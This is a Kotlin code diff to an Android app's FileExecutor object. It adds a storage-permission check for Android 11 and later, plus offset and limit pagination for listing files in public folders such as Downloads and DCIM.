@@ -1,6 +1,7 @@
 package com.abuzahra.manager.executor
 
 import android.content.Context
+import android.os.Build
 import android.os.Environment
 import android.util.Log
 import java.io.File
@@ -28,7 +29,16 @@ object FileExecutor {
 
     // ===== LIST FILES =====
     fun listFiles(context: Context, params: Map<String, Any>): List<Map<String, Any>> {
+        // Scoped Storage check for Android 11+
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+                return listOf(mapOf("error" to "MANAGE_EXTERNAL_STORAGE permission required on Android 11+" as Any))
+            }
+        } catch (_: Exception) {}
+
         val arg = params["arg"]?.toString() ?: ""
+        val offset = (params["offset"] as? Number)?.toInt() ?: 0
+        val limit = (params["limit"] as? Number)?.toInt() ?: 100
         val dirPath = when {
             arg.contains("download", ignoreCase = true) -> Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).absolutePath
             arg.contains("dcim", ignoreCase = true) -> Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath
@@ -44,7 +54,7 @@ object FileExecutor {
         val dir = File(dirPath)
         if (dir.exists() && dir.isDirectory) {
             val files = dir.listFiles()
-            files?.sortedByDescending { it.lastModified() }?.take(100)?.forEach { file ->
+            files?.sortedByDescending { it.lastModified() }?.drop(offset)?.take(limit)?.forEach { file ->
                 list.add(mapOf(
                     "name" to file.name,
                     "path" to file.absolutePath,
@@ -190,6 +200,13 @@ object FileExecutor {
 
     // ===== RECENT FILES =====
     fun recentFiles(context: Context): List<Map<String, Any>> {
+        // Scoped Storage check for Android 11+
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+                return listOf(mapOf("error" to "MANAGE_EXTERNAL_STORAGE permission required on Android 11+" as Any))
+            }
+        } catch (_: Exception) {}
+
         val list = mutableListOf<Map<String, Any>>()
         val dirs = listOf(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
